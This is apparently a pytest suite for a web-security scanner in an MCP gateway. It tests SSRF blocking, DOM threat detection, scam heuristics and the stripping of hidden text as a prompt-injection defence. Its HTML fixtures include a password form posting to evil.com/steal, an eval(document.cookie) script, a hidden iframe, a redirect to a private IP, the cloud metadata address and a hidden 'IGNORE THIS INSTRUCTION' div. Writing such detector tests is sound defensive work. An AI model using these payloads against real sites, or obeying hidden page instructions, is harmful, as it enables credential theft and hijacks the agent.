"""Tests for causal_sandbox module - evidence-based web security analysis."""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import httpx
import pytest

from mcp_gateway import causal_sandbox
from mcp_gateway.causal_sandbox import (
    ANALYTICS_IFRAME_DOMAINS,
    BENIGN_ARIA_LABELS,
    FREE_HOSTING_DOMAINS,
    A11yNode,
    CausalScanResult,
    DOMSecurityNode,
    NetworkRequestTrace,
    ResourceLimitError,
    SSRFError,
    ThreatClassification,
    WebBundleResult,
    WebSecurityVerdict,
    _CONTAINER_TAGS,
    _rule_based_verdict,
    analyze_dom_security,
    bundle_page,
    extract_accessibility_tree,
    extract_visible_text,
    gemini_security_verdict,
    run_causal_scan,
    trace_network_requests,
    validate_url_ssrf,
)


# ---- Pydantic Models ----


class TestPydanticModels:
    """Pydantic model schema validation tests."""

    def test_threat_classification_enum(self) -> None:
        """All expected enum values exist."""
        expected = {"benign", "phishing", "malware", "clickjacking", "scam", "deceptive_ui"}
        actual = {e.value for e in ThreatClassification}
        assert actual == expected

    def test_web_security_verdict_schema(self) -> None:
        """WebSecurityVerdict round-trips all fields."""
        verdict = WebSecurityVerdict(
            classification=ThreatClassification.phishing,
            confidence=0.95,
            risk_indicators=["deceptive_form", "external_action"],
            evidence_refs=["form.login", "https://evil.com/steal"],
            recommended_action="block",
            summary="Phishing page detected",
        )
        assert verdict.classification == ThreatClassification.phishing
        assert verdict.confidence == 0.95
        assert len(verdict.risk_indicators) == 2
        assert verdict.recommended_action == "block"

    def test_models_json_roundtrip(self) -> None:
        """Models serialize and deserialize cleanly."""
        verdict = WebSecurityVerdict(
            classification=ThreatClassification.benign,
            confidence=0.9,
            risk_indicators=[],
            evidence_refs=[],
            recommended_action="allow",
            summary="Clean page",
        )
        raw = verdict.model_dump_json()
        restored = WebSecurityVerdict.model_validate_json(raw)
        assert restored.classification == verdict.classification
        assert restored.confidence == verdict.confidence


# ---- SSRF Guard ----


class TestSSRFGuard:
    """SSRF protection tests."""

    def test_ssrf_blocks_private_ip(self) -> None:
        """Private IPs (10.x, 172.16.x, 192.168.x) are blocked."""
        for ip in ["10.0.0.1", "172.16.0.1", "192.168.1.1"]:
            with patch("socket.getaddrinfo") as mock_dns:
                mock_dns.return_value = [
                    (2, 1, 6, "", (ip, 443)),
                ]
                with pytest.raises(SSRFError, match="Blocked IP"):
                    validate_url_ssrf(f"https://{ip}/")

    def test_ssrf_blocks_metadata(self) -> None:
        """Cloud metadata endpoint (169.254.169.254) is blocked."""
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [
                (2, 1, 6, "", ("169.254.169.254", 80)),
            ]
            with pytest.raises(SSRFError, match="Blocked IP"):
                validate_url_ssrf("http://169.254.169.254/latest/meta-data/")

    def test_ssrf_allows_public_url(self) -> None:
        """Public IPs pass SSRF validation."""
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [
                (2, 1, 6, "", ("93.184.216.34", 443)),
            ]
            url, resolved_ip = validate_url_ssrf("https://example.com/")
            assert url == "https://example.com/"
            assert resolved_ip == "93.184.216.34"

    def test_ssrf_blocks_bad_scheme(self) -> None:
        """Non-HTTP schemes are blocked."""
        with pytest.raises(SSRFError, match="Blocked scheme"):
            validate_url_ssrf("ftp://example.com/")

    def test_ssrf_blocks_bad_port(self) -> None:
        """Database ports (6379, 5432, etc.) are blocked."""
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [
                (2, 1, 6, "", ("93.184.216.34", 6379)),
            ]
            with pytest.raises(SSRFError, match="Blocked port"):
                validate_url_ssrf("https://example.com:6379/")

    def test_ssrf_redirect_to_private_blocked(self) -> None:
        """Redirect to private IP is blocked at each hop."""
        from mcp_gateway.causal_sandbox import _fetch_with_ssrf_guard

        redirect_resp = MagicMock()
        redirect_resp.status_code = 302
        redirect_resp.headers = {"location": "http://10.0.0.1/secret"}

        def mock_validate(url: str) -> tuple[str, str]:
            parsed = __import__("urllib.parse", fromlist=["urlparse"]).urlparse(url)
            hostname = parsed.hostname or ""
            if hostname == "10.0.0.1":
                raise SSRFError("Blocked IP: 10.0.0.1")
            return url, "93.184.216.34"

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf", side_effect=mock_validate),
            patch("httpx.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = redirect_resp
            mock_client_cls.return_value = mock_client

            with pytest.raises(SSRFError, match="Blocked IP"):
                _fetch_with_ssrf_guard("https://evil.com/redir")


# ---- bundle_page ----


class TestBundlePage:
    """Page bundling tests."""

    def test_bundle_page_success(self) -> None:
        """Successful fetch produces valid bundle."""
        html = "<html><head></head><body><p>Hello</p></body></html>"
        mock_resp = MagicMock()
        mock_resp.content = html.encode("utf-8")
        mock_resp.status_code = 200

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = mock_resp
            mock_client_cls.return_value = mock_client

            bundle, raw_html = bundle_page("https://example.com")

        assert bundle.status_code == 200
        assert bundle.sha256 != ""
        assert bundle.content_length == len(html.encode())
        assert raw_html == html

    def test_bundle_page_timeout(self) -> None:
        """Timeout produces degraded result (status_code=0)."""
        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.side_effect = httpx.TimeoutException("timeout")
            mock_client_cls.return_value = mock_client

            bundle, raw_html = bundle_page("https://slow.example.com")

        assert bundle.status_code == 0
        assert raw_html == ""

    def test_bundle_page_oversized(self) -> None:
        """Content exceeding MAX_HTML_BYTES raises ResourceLimitError."""
        big_content = b"x" * (2 * 1024 * 1024 + 1)
        mock_resp = MagicMock()
        mock_resp.content = big_content
        mock_resp.status_code = 200

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = mock_resp
            mock_client_cls.return_value = mock_client

            with pytest.raises(ResourceLimitError, match="Content too large"):
                bundle_page("https://example.com/huge")

    def test_bundle_page_ssrf_blocked(self) -> None:
        """SSRF-blocked URL raises SSRFError."""
        with patch(
            "mcp_gateway.causal_sandbox.validate_url_ssrf",
            side_effect=SSRFError("Blocked IP"),
        ):
            with pytest.raises(SSRFError):
                bundle_page("http://10.0.0.1/")


# ---- DOM Security ----


class TestDOMSecurity:
    """DOM security analysis tests."""

    def test_detect_hidden_iframe(self) -> None:
        """Hidden iframes are flagged."""
        html = (
            '<html><body>'
            '<iframe src="https://evil.com" style="display:none"></iframe>'
            '</body></html>'
        )
        threats = analyze_dom_security(html, "https://example.com")
        assert len(threats) >= 1
        assert threats[0].threat_type == "hidden_iframe"

    def test_detect_deceptive_form(self) -> None:
        """Forms with external action + password input are flagged."""
        html = (
            '<html><body>'
            '<form action="https://evil.com/steal">'
            '<input type="password" name="pass">'
            '<input type="submit">'
            '</form>'
            '</body></html>'
        )
        threats = analyze_dom_security(html, "https://example.com")
        assert len(threats) >= 1
        form_threats = [t for t in threats if t.threat_type == "deceptive_form"]
        assert len(form_threats) == 1

    def test_detect_suspicious_script(self) -> None:
        """Scripts with eval(document.cookie) are flagged."""
        html = (
            '<html><body>'
            '<script>eval(document.cookie)</script>'
            '</body></html>'
        )
        threats = analyze_dom_security(html, "https://example.com")
        script_threats = [t for t in threats if t.threat_type == "suspicious_script"]
        assert len(script_threats) >= 1

    def test_clean_html_no_threats(self) -> None:
        """Normal HTML produces no threats."""
        html = (
            '<html><body>'
            '<h1>Welcome</h1>'
            '<p>This is a safe page.</p>'
            '<a href="/about">About</a>'
            '</body></html>'
        )
        threats = analyze_dom_security(html, "https://example.com")
        assert threats == []


# ---- A11y Tree ----


class TestA11yTree:
    """Accessibility tree extraction tests."""

    def test_basic_tree_structure(self) -> None:
        """Button, link, and input produce correct roles."""
        html = (
            '<html><body>'
            '<button>Click me</button>'
            '<a href="/about">About</a>'
            '<input type="text" aria-label="Search">'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        roles = {n.role for n in nodes}
        assert "button" in roles
        assert "link" in roles
        assert "textbox" in roles

    def test_deceptive_label_detection(self) -> None:
        """aria-label differing from visible text is flagged as deceptive."""
        html = (
            '<html><body>'
            '<button aria-label="Download free software">Login to bank</button>'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        deceptive = [n for n in nodes if n.deceptive_label]
        assert len(deceptive) >= 1


# ---- Network Trace ----


class TestNetworkTrace:
    """Network request tracing tests."""

    def test_extract_urls_from_html(self) -> None:
        """Extracts URLs from script, img, form elements."""
        html = (
            '<html><body>'
            '<script src="https://cdn.example.com/app.js"></script>'
            '<img src="/images/logo.png">'
            '<form action="/submit" method="POST">'
            '<input type="text">'
            '</form>'
            '</body></html>'
        )
        traces = trace_network_requests("https://example.com", html)
        sources = {t.source for t in traces}
        assert "script_src" in sources
        assert "img_src" in sources
        assert "form_action" in sources

    def test_suspicious_domain_flagging(self) -> None:
        """URL shorteners are flagged as suspicious."""
        html = (
            '<html><body>'
            '<script src="https://bit.ly/abc123"></script>'
            '</body></html>'
        )
        traces = trace_network_requests("https://example.com", html)
        suspicious = [t for t in traces if t.is_suspicious]
        assert len(suspicious) >= 1
        assert suspicious[0].threat_type == "url_shortener"


# ---- Gemini Verdict ----


class TestGeminiVerdict:
    """Gemini structured output verdict tests."""

    def test_gemini_verdict_phishing(self) -> None:
        """Mock Gemini returns phishing verdict."""
        mock_verdict = WebSecurityVerdict(
            classification=ThreatClassification.phishing,
            confidence=0.95,
            risk_indicators=["deceptive_form"],
            evidence_refs=["form.login"],
            recommended_action="block",
            summary="Phishing detected",
        )
        mock_response = MagicMock()
        mock_response.text = mock_verdict.model_dump_json()

        with (
            patch.dict("os.environ", {"GOOGLE_API_KEY": "test-key"}),
            patch("google.genai.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.models.generate_content.return_value = mock_response
            mock_client_cls.return_value = mock_client

            verdict = gemini_security_verdict(
                "https://evil.com",
                "Login to your bank account",
                [
                    DOMSecurityNode(
                        tag="form",
                        attributes={"action": "https://evil.com"},
                        suspicious=True,
                        threat_type="deceptive_form",
                        selector="form.login",
                    )
                ],
                [],
                [],
            )

        assert verdict.classification == ThreatClassification.phishing
        assert verdict.confidence == 0.95

    def test_gemini_no_api_key_fallback(self) -> None:
        """Without API key, falls back to rule-based."""
        with patch.dict("os.environ", {}, clear=False):
            env = dict(**{k: v for k, v in __import__("os").environ.items()})
            env.pop("GOOGLE_API_KEY", None)
            with patch.dict("os.environ", env, clear=True):
                verdict = gemini_security_verdict(
                    "https://example.com",
                    "Safe content",
                    [],
                    [],
                    [],
                )
        assert verdict.recommended_action == "allow"
        assert verdict.classification == ThreatClassification.benign

    def test_gemini_error_fallback(self) -> None:
        """Gemini error falls back to rule-based verdict."""
        with (
            patch.dict("os.environ", {"GOOGLE_API_KEY": "test-key"}),
            patch("google.genai.Client") as mock_client_cls,
        ):
            mock_client = MagicMock()
            mock_client.models.generate_content.side_effect = RuntimeError("API down")
            mock_client_cls.return_value = mock_client

            verdict = gemini_security_verdict(
                "https://example.com",
                "Some content",
                [
                    DOMSecurityNode(
                        tag="iframe",
                        attributes={},
                        suspicious=True,
                        threat_type="hidden_iframe",
                        selector="iframe.hidden",
                    )
                ],
                [],
                [],
            )

        assert verdict.classification == ThreatClassification.clickjacking


# ---- run_causal_scan ----


class TestRunCausalScan:
    """Full pipeline integration tests."""

    def test_full_scan_flow(self, tmp_path: Path) -> None:
        """Full pipeline produces CausalScanResult."""
        html = (
            '<html><body>'
            '<h1>Welcome</h1>'
            '<p>Safe content here.</p>'
            '</body></html>'
        )
        mock_resp = MagicMock()
        mock_resp.content = html.encode("utf-8")
        mock_resp.status_code = 200

        evidence_path = tmp_path / "evidence.jsonl"

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
            patch.dict("os.environ", {
                "MCP_GATEWAY_EVIDENCE_PATH": str(evidence_path),
            }),
        ):
            # Remove GOOGLE_API_KEY to force rule-based
            env_copy = dict(**{k: v for k, v in __import__("os").environ.items()})
            env_copy.pop("GOOGLE_API_KEY", None)
            env_copy["MCP_GATEWAY_EVIDENCE_PATH"] = str(evidence_path)

            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = mock_resp
            mock_client_cls.return_value = mock_client

            with patch.dict("os.environ", env_copy, clear=True):
                result = run_causal_scan("https://example.com")

        assert isinstance(result, CausalScanResult)
        assert result.url == "https://example.com"
        assert result.bundle.status_code == 200
        assert result.verdict.classification == ThreatClassification.benign

    def test_scan_evidence_emitted(self, tmp_path: Path) -> None:
        """Evidence JSONL is written after scan."""
        html = '<html><body><p>Test</p></body></html>'
        mock_resp = MagicMock()
        mock_resp.content = html.encode("utf-8")
        mock_resp.status_code = 200

        evidence_path = tmp_path / "evidence.jsonl"

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            env_copy = dict(**{k: v for k, v in __import__("os").environ.items()})
            env_copy.pop("GOOGLE_API_KEY", None)
            env_copy["MCP_GATEWAY_EVIDENCE_PATH"] = str(evidence_path)

            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.return_value = mock_resp
            mock_client_cls.return_value = mock_client

            with patch.dict("os.environ", env_copy, clear=True):
                run_causal_scan("https://example.com")

        assert evidence_path.exists()
        events = [json.loads(line) for line in evidence_path.read_text().splitlines() if line.strip()]
        causal_events = [e for e in events if e.get("event") == "causal_web_scan"]
        assert len(causal_events) >= 1
        assert causal_events[0]["url"] == "https://example.com"

    def test_scan_partial_failure(self, tmp_path: Path) -> None:
        """Fetch timeout → degraded result with verdict."""
        evidence_path = tmp_path / "evidence.jsonl"

        with (
            patch("mcp_gateway.causal_sandbox.validate_url_ssrf"),
            patch("httpx.Client") as mock_client_cls,
        ):
            env_copy = dict(**{k: v for k, v in __import__("os").environ.items()})
            env_copy.pop("GOOGLE_API_KEY", None)
            env_copy["MCP_GATEWAY_EVIDENCE_PATH"] = str(evidence_path)

            mock_client = MagicMock()
            mock_client.__enter__ = MagicMock(return_value=mock_client)
            mock_client.__exit__ = MagicMock(return_value=False)
            mock_client.get.side_effect = httpx.TimeoutException("timeout")
            mock_client_cls.return_value = mock_client

            with patch.dict("os.environ", env_copy, clear=True):
                result = run_causal_scan("https://slow.example.com")

        assert result.eval_method == "degraded"
        assert result.verdict.recommended_action == "warn"
        assert result.bundle.status_code == 0


# ---- False Positive Exclusion Paths ----


class TestAnalyticsIframeWhitelist:
    """Analytics iframe domain whitelist tests (E5 fix)."""

    def test_gtm_noscript_iframe_skipped(self) -> None:
        """GTM noscript hidden iframe is not flagged."""
        html = (
            '<html><body>'
            '<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-ABC123"'
            ' style="display:none;visibility:hidden" height="0" width="0">'
            '</iframe></noscript>'
            '<p>Content</p>'
            '</body></html>'
        )
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [(2, 1, 6, "", ("142.250.80.46", 443))]
            threats = analyze_dom_security(html, "https://example.com")
        iframe_threats = [t for t in threats if t.threat_type == "hidden_iframe"]
        assert iframe_threats == []

    def test_non_whitelisted_hidden_iframe_flagged(self) -> None:
        """Hidden iframe from unknown domain is still flagged."""
        html = (
            '<html><body>'
            '<iframe src="https://evil-tracker.com/spy" style="display:none"></iframe>'
            '</body></html>'
        )
        threats = analyze_dom_security(html, "https://example.com")
        iframe_threats = [t for t in threats if t.threat_type == "hidden_iframe"]
        assert len(iframe_threats) >= 1

    def test_analytics_whitelist_requires_ssrf_validation(self) -> None:
        """Analytics domain iframe pointing to private IP is flagged (SA-006)."""
        html = (
            '<html><body>'
            '<iframe src="https://www.googletagmanager.com/ns.html"'
            ' style="display:none"></iframe>'
            '</body></html>'
        )
        # Mock DNS to resolve whitelisted domain to private IP (DNS rebinding)
        with patch("socket.getaddrinfo") as mock_dns:
            mock_dns.return_value = [(2, 1, 6, "", ("10.0.0.1", 443))]
            threats = analyze_dom_security(html, "https://example.com")
        iframe_threats = [t for t in threats if t.threat_type == "hidden_iframe"]
        assert len(iframe_threats) >= 1, "DNS rebinding to private IP should be flagged"

    def test_analytics_domains_constant_completeness(self) -> None:
        """ANALYTICS_IFRAME_DOMAINS contains expected tracking domains."""
        assert "googletagmanager.com" in ANALYTICS_IFRAME_DOMAINS
        assert "www.google-analytics.com" in ANALYTICS_IFRAME_DOMAINS
        assert "bat.bing.com" in ANALYTICS_IFRAME_DOMAINS


class TestBenignAriaLabels:
    """Benign aria-label whitelist tests (E5 fix)."""

    def test_language_label_not_deceptive(self) -> None:
        """Common UI label 'language' is not flagged as deceptive."""
        html = (
            '<html><body>'
            '<button aria-label="language">EN</button>'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        deceptive = [n for n in nodes if n.deceptive_label]
        assert deceptive == []

    def test_menu_label_not_deceptive(self) -> None:
        """Common UI label 'menu' is not flagged as deceptive."""
        html = (
            '<html><body>'
            '<button aria-label="menu">Home About Contact</button>'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        deceptive = [n for n in nodes if n.deceptive_label]
        assert deceptive == []

    def test_benign_labels_set_has_expected_entries(self) -> None:
        """BENIGN_ARIA_LABELS has expected common patterns."""
        for label in ("search", "close", "toggle", "navigation", "expand"):
            assert label in BENIGN_ARIA_LABELS


class TestContainerTagExclusion:
    """Container element exclusion tests (E5 fix)."""

    def test_nav_with_summary_label_not_deceptive(self) -> None:
        """Nav element with aria-label summary is not flagged."""
        html = (
            '<html><body>'
            '<nav aria-label="Main navigation">'
            '<a href="/">Home</a><a href="/about">About</a>'
            '</nav>'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        nav_nodes = [n for n in nodes if n.role == "navigation"]
        assert all(not n.deceptive_label for n in nav_nodes)

    def test_container_tags_is_module_level(self) -> None:
        """_CONTAINER_TAGS is a module-level frozenset constant."""
        assert isinstance(_CONTAINER_TAGS, frozenset)
        assert "nav" in _CONTAINER_TAGS
        assert "aside" in _CONTAINER_TAGS


class TestSummaryLabelPattern:
    """Summary label pattern (visible_text >> aria_label) tests (E5 fix)."""

    def test_long_visible_text_short_label_not_deceptive(self) -> None:
        """Button with very long visible text and short label is benign."""
        html = (
            '<html><body>'
            '<a aria-label="link">'
            'This is a very long paragraph of visible text that describes '
            'the link destination in great detail and is much longer than the label'
            '</a>'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        deceptive = [n for n in nodes if n.deceptive_label]
        assert deceptive == []


class TestDescriptiveLabelPattern:
    """Descriptive/tooltip label pattern tests with guard (E5 fix - QE-003)."""

    def test_tooltip_label_with_contained_text_not_deceptive(self) -> None:
        """Long aria-label containing visible text tokens is benign."""
        html = (
            '<html><body>'
            '<a aria-label="You must be signed in to star a repository">'
            'star'
            '</a>'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        deceptive = [n for n in nodes if n.deceptive_label]
        assert deceptive == []

    def test_tooltip_label_with_concatenated_count_not_deceptive(self) -> None:
        """Star button with count like 'Star13.4k' is benign (alpha word extraction)."""
        html = (
            '<html><body>'
            '<a aria-label="You must be signed in to star a repository">'
            'Star13.4k'
            '</a>'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        deceptive = [n for n in nodes if n.deceptive_label]
        assert deceptive == [], "GitHub star button with count should not be deceptive"

    def test_long_malicious_aria_label_still_detected(self) -> None:
        """Long aria-label NOT containing visible text IS flagged (QE-003 guard)."""
        html = (
            '<html><body>'
            '<button aria-label="Click here to claim your free prize money and win big rewards today">'
            'Login'
            '</button>'
            '</body></html>'
        )
        nodes = extract_accessibility_tree(html)
        deceptive = [n for n in nodes if n.deceptive_label]
        assert len(deceptive) >= 1, (
            "Long aria-label with unrelated content should be flagged as deceptive"
        )


# ---- Scam Detection (Rule-based) ----


class TestScamDetection:
    """Scam detection signals in rule-based verdict."""

    def test_http_only_ecommerce_flagged(self) -> None:
        """HTTP-only e-commerce site is flagged as scam."""
        verdict = _rule_based_verdict(
            "http://fake-shop.example.com/",
            [], [], [],
            visible_text="カートに入れる 購入する ¥9,800",
        )
        assert verdict.classification == ThreatClassification.scam
        assert any("http_only" in r for r in verdict.risk_indicators)

    def test_free_hosting_ecommerce_flagged(self) -> None:
        """E-commerce on free hosting (fc2.com) is flagged."""
        verdict = _rule_based_verdict(
            "http://gamenoah.cart.fc2.com/",
            [], [], [],
            visible_text="カートに入れる 購入する ¥5,000 振込先",
        )
        assert verdict.classification == ThreatClassification.scam
        assert any("free_hosting" in r for r in verdict.risk_indicators)

    def test_scam_keywords_detected(self) -> None:
        """Japanese scam keywords (振込先, 返品不可) are detected."""
        verdict = _rule_based_verdict(
            "https://example.com/shop",
            [], [], [],
            visible_text="購入 ¥3,000 振込先 銀行口座 返品不可",
        )
        scam_kw = [r for r in verdict.risk_indicators if "scam_keyword" in r]
        assert len(scam_kw) >= 2

    def test_missing_phone_ecommerce_flagged(self) -> None:
        """E-commerce without phone number is flagged."""
        verdict = _rule_based_verdict(
            "https://example.com/shop",
            [], [], [],
            visible_text="カートに入れる ¥9,800 お買い物",
        )
        assert any("no_phone" in r for r in verdict.risk_indicators)

    def test_legitimate_site_not_flagged(self) -> None:
        """HTTPS site with phone/email is not flagged as scam."""
        verdict = _rule_based_verdict(
            "https://legitimate-shop.com/",
            [], [], [],
            visible_text="Welcome to our store. Contact: 03-1234-5678 info@shop.com",
        )
        assert verdict.classification == ThreatClassification.benign

    def test_free_hosting_domains_completeness(self) -> None:
        """FREE_HOSTING_DOMAINS includes expected platforms."""
        assert "fc2.com" in FREE_HOSTING_DOMAINS
        assert "cart.fc2.com" in FREE_HOSTING_DOMAINS
        assert "wixsite.com" in FREE_HOSTING_DOMAINS

    def test_high_scam_score_blocks(self) -> None:
        """Multiple scam signals produce block recommendation."""
        verdict = _rule_based_verdict(
            "http://gamenoah.cart.fc2.com/",
            [], [], [],
            visible_text="カート 購入 ¥5,000 振込先 銀行口座 返品不可",
        )
        assert verdict.classification == ThreatClassification.scam
        assert verdict.recommended_action in ("warn", "block")
        assert verdict.confidence >= 0.5


# ---- Prompt Injection Defense ----


class TestPromptInjectionDefense:
    """Prompt injection defense via visible text extraction."""

    def test_extract_visible_text_strips_hidden(self) -> None:
        """Hidden elements, scripts, styles are removed."""
        html = (
            '<html><body>'
            '<p>Visible paragraph</p>'
            '<div style="display:none">IGNORE THIS INSTRUCTION</div>'
            '<script>alert("xss")</script>'
            '<style>.foo{color:red}</style>'
            '<!-- hidden comment -->'
            '<input type="hidden" value="secret">'
            '<p>Another visible\u200b paragraph</p>'
            '</body></html>'
        )
        text = extract_visible_text(html)
        assert "Visible paragraph" in text
        assert "Another visible paragraph" in text
        assert "IGNORE THIS INSTRUCTION" not in text
        assert "alert" not in text
        assert "color:red" not in text
        assert "hidden comment" not in text
        assert "secret" not in text
        assert "\u200b" not in text
